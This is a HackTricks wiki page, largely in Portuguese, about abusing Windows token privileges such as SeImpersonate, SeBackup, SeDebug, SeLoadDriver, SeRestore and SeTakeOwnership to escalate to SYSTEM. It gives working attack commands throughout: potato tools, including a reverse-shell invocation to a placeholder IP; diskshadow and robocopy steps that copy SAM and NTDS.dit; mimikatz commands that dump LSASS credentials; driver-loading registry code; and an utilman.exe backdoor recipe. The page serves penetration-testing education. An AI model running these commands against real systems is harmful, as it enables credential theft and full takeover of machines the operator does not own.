# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se você **não sabe o que são Windows Access Tokens** leia esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Talvez você consiga escalar privilégios abusando dos tokens que você já tem**

### SeImpersonatePrivilege

Este é um privilege que é mantido por qualquer process e permite a impersonation (mas não a criação) de qualquer token, desde que um handle para ele possa ser obtido. Um token privilegiado pode ser adquirido de um Windows service (DCOM) ao induzi-lo a realizar autenticação NTLM contra um exploit, habilitando subsequentemente a execução de um process com privilégios SYSTEM. Esta vulnerabilidade pode ser explorada usando várias ferramentas, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requer winrm desabilitado), [SweetPotato](https://github.com/CCob/SweetPotato), e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

É muito semelhante a **SeImpersonatePrivilege**, ele usará o **mesmo método** para obter um token privilegiado.\
Então, esse privilégio permite **atribuir um token primário** a um novo processo/processo suspenso. Com o token de impersonation privilegiado, você pode derivar um token primário (DuplicateTokenEx).\
Com o token, você pode criar um **novo processo** com 'CreateProcessAsUser' ou criar um processo suspenso e **definir o token** (em geral, você não pode modificar o token primário de um processo em execução).

### SeTcbPrivilege

Se você tiver esse token habilitado, pode usar **KERB_S4U_LOGON** para obter um **token de impersonation** para qualquer outro usuário sem conhecer as credenciais, **adicionar um grupo arbitrário** (admins) ao token, definir o **nível de integridade** do token para "**medium**" e atribuir esse token à **thread atual** (SetThreadToken).

### SeBackupPrivilege

O sistema é feito para **conceder todo o acesso de leitura** a qualquer arquivo (limitado a operações de leitura) por esse privilégio. Ele é utilizado para **ler os hashes de senha de contas local Administrator** do registry, após o que ferramentas como "**psexec**" ou "**wmiexec**" podem ser usadas com o hash (técnica Pass-the-Hash). No entanto, essa técnica falha em duas condições: quando a conta Local Administrator está desabilitada, ou quando há uma política em vigor que remove os direitos administrativos dos Local Administrators que se conectam remotamente.\
Na prática, o fluxo de trabalho built-in mais confiável geralmente é **VSS + `robocopy /b`**: criar/expor uma shadow copy, depois copiar `SAM`/`SYSTEM` ou `NTDS.dit` em **backup mode**, o que contorna as ACLs do arquivo.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Você pode **abusar desse privilégio** com:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguindo **IppSec** em [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ou como explicado na seção **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

A permissão de **write access** em qualquer arquivo do sistema, independentemente do Access Control List (ACL) do arquivo, é fornecida por este privilégio. Ele abre inúmeras possibilidades de escalation, incluindo a capacidade de **modificar services**, realizar DLL Hijacking e definir **debuggers** via Image File Execution Options, entre várias outras técnicas.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege é uma permissão poderosa, especialmente útil quando um usuário possui a capacidade de impersonate tokens, mas também na ausência de SeImpersonatePrivilege. Essa capacidade depende da habilidade de impersonar um token que represente o mesmo usuário e cujo integrity level não exceda o do processo atual.

**Pontos Principais:**

- **Impersonation without SeImpersonatePrivilege:** É possível aproveitar SeCreateTokenPrivilege para EoP sob condições específicas.
- **Conditions for Token Impersonation:** A impersonation bem-sucedida exige que o token alvo pertença ao mesmo usuário e tenha um integrity level menor ou igual ao integrity level do processo que tenta a impersonation.
- **Creation and Modification of Impersonation Tokens:** Usuários podem criar um impersonation token e aprimorá-lo adicionando o SID (Security Identifier) de um grupo privilegiado.

### SeLoadDriverPrivilege

Este privilégio permite **load and unload device drivers** com a criação de uma entrada de registry com valores específicos para `ImagePath` e `Type`. Como o write access direto em `HKLM` (HKEY_LOCAL_MACHINE) é restrito, `HKCU` (HKEY_CURRENT_USER) deve ser usado em seu lugar. No entanto, para tornar `HKCU` reconhecível pelo kernel para a configuração do driver, um caminho específico deve ser seguido.

O uso ofensivo moderno geralmente é **BYOVD** (bring your own vulnerable driver): carregue um driver de kernel **assinado mas vulnerável** e depois use seus IOCTLs para desativar proteções ou chegar à execução de código em kernel. Tenha em mente que, em builds recentes do Windows 11/Server, a **Microsoft vulnerable driver blocklist** e/ou **HVCI/Memory Integrity** frequentemente quebram cadeias públicas antigas, então os exemplos clássicos no estilo `szkg64.sys` não são mais confiáveis de forma universal.

Esse caminho é `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, onde `<RID>` é o Relative Identifier do usuário atual. Dentro de `HKCU`, todo esse caminho deve ser criado, e dois valores precisam ser definidos:

- `ImagePath`, que é o caminho para o binário a ser executado
- `Type`, com um valor de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Passos a Seguir:**

1. Acesse `HKCU` em vez de `HKLM` devido ao write access restrito.
2. Crie o caminho `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, onde `<RID>` representa o Relative Identifier do usuário atual.
3. Defina `ImagePath` como o caminho de execução do binário.
4. Atribua `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Mais maneiras de abusar deste privilege em [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Isso é semelhante a **SeRestorePrivilege**. Sua função principal permite que um processo **assuma a propriedade de um objeto**, contornando a necessidade de acesso discricionário explícito por meio da concessão de WRITE_OWNER access rights. O processo envolve primeiro obter a propriedade da chave de registro pretendida para fins de escrita, e então alterar a DACL para habilitar operações de escrita.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilégio permite **debug outros processos**, incluindo ler e escrever na memória. Várias estratégias de memory injection, capazes de evadir a maioria das soluções de antivírus e host intrusion prevention, podem ser empregadas com este privilégio.

Em Windows modernos, lembre-se de que `SeDebugPrivilege` geralmente é suficiente para abrir **processos SYSTEM não protegidos** e duplicar seus tokens, mas **não** é garantia de que você conseguirá acessar o **LSASS**. Se **RunAsPPL / LSA Protection** estiver habilitado, processos não protegidos não podem ler nem fazer inject into LSASS mesmo com `SeDebugPrivilege` presente. Nesse caso, roube um token de outro processo SYSTEM não-PPL, ou encadeie com um PPL bypass/BYOVD em vez de assumir que `procdump` vai funcionar. Para um exemplo completo de cópia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, veja [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Você pode usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) da [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar a memória de um processo**. Especificamente, isso pode ser aplicado ao processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, que é responsável por armazenar credenciais de usuário depois que um usuário fez login com sucesso em um sistema.

Depois você pode carregar esse dump no mimikatz para obter passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se você quiser obter um shell `NT SYSTEM`, você pode usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Este direito (Perform volume maintenance tasks) permite abrir handles de dispositivo de volume bruto (por exemplo, \\.\C:) para I/O direto em disco que contorna ACLs do NTFS. Com ele você pode copiar bytes de qualquer arquivo no volume lendo os blocos subjacentes, permitindo leitura arbitrária de arquivos sensíveis (por exemplo, chaves privadas da máquina em %ProgramData%\Microsoft\Crypto\, hives do registry, SAM/NTDS via VSS). Isso é particularmente impactante em servidores CA, onde exfiltrar a chave privada da CA permite forjar um Golden Certificate para se passar por qualquer principal.

Veja técnicas detalhadas e mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Os **tokens que aparecem como Disabled** normalmente podem ser habilitados, então você pode frequentemente abusar tanto de privilégios _Enabled_ quanto _Disabled_.

### Enable All the tokens

Se você tiver privilégios disabled, você pode usar o script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos os tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ou o **script** incorporado neste [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Cheatsheet completa de token privileges em [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), o resumo abaixo listará apenas formas diretas de explorar a privilege para obter uma sessão admin ou ler arquivos sensíveis.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Obrigado [Aurélien Chalot](https://twitter.com/Defte_) pela atualização. Vou tentar reformular isso para algo mais parecido com uma receita em breve.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ler arquivos sensíveis com `robocopy /b` ou helpers dedicados compatíveis com SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ótimo para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, e às vezes `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` é prático, mas cmdlets/APIs dedicados ao SeBackup geralmente são mais flexíveis para arquivos bloqueados/abertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Criar um token arbitrário incluindo direitos de local admin com `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicar um token SYSTEM **non-PPL** ou fazer dump de memória de um processo não protegido.                                                                                                                                                                                                                                                                 | <p>LSASS dumping é comumente bloqueado se RunAsPPL/LSA Protection estiver habilitado.</p><p>Script pode ser encontrado em [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Usar a **Potato family** / impersonation por named-pipe para iniciar SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Mais prático a partir de service accounts como IIS APPPOOL, MSSQL, scheduled tasks, ou qualquer contexto que já possua `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Carregar um kernel driver assinado porém vulnerável (BYOVD)<br>2. Usar os IOCTLs do driver para obter kernel R/W, desativar ferramentas de segurança ou elevar para SYSTEM<br><br>Alternativamente, a privilege pode ser usada para descarregar drivers relacionados à segurança com o comando builtin <code>fltMC</code>, isto é, <code>fltMC sysmondrv</code></p>                     | <p>Drivers públicos mais antigos como <code>szkg64.sys</code> estão cada vez mais bloqueados em Windows modernos pela vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Iniciar PowerShell/ISE com a privilege SeRestore presente.<br>2. Habilitar a privilege com <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renomear utilman.exe para utilman.old<br>4. Renomear cmd.exe para utilman.exe<br>5. Bloquear a console e pressionar Win+U</p> | <p>O ataque pode ser detectado por algum software AV.</p><p>Método alternativo depende de substituir service binaries armazenados em "Program Files" usando a mesma privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renomear cmd.exe para utilman.exe<br>4. Bloquear a console e pressionar Win+U</p>                                                                                                                                       | <p>O ataque pode ser detectado por algum software AV.</p><p>Método alternativo depende de substituir service binaries armazenados em "Program Files" usando a mesma privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipular tokens para incluir direitos de local admin. Pode exigir SeImpersonate.</p><p>A verificar.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Dê uma olhada nesta tabela que define Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Dê uma olhada em [**este paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) sobre privesc com tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
